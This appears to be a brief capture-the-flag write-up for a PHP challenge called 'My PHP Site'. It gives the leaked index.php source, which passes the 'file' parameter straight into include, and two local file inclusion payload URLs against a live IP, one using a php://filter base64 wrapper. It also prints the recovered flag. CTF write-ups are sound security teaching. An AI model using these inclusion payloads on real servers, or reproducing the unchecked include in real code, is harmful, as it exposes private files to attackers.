# My PHP Site

**lfi**: http://159.223.166.39:15000/?file=php://filter/convert.base64-encode/resource=index.php

source-code: index.php 
```php
<?php

if(isset($_GET['file'])){
    if ($_GET['file'] == "index.php") {
        echo "<h1>ERROR!!</h1>";
        die();
    }else{
        include $_GET['file'];
    }

}else{
    echo "<h1>You are missing the file parameter</h1>";

    #note :- secret location /home/tareq/s3crEt_fl49.txt
}
# neu khong co comment thi tim ra kieu gi, sau nay minh moi thay??/
?>
```
**payload**:http://159.223.166.39:15000/?file=s3crEt_fl49.txt

**flag**: KCTF{L0C4L_F1L3_1ncLu710n}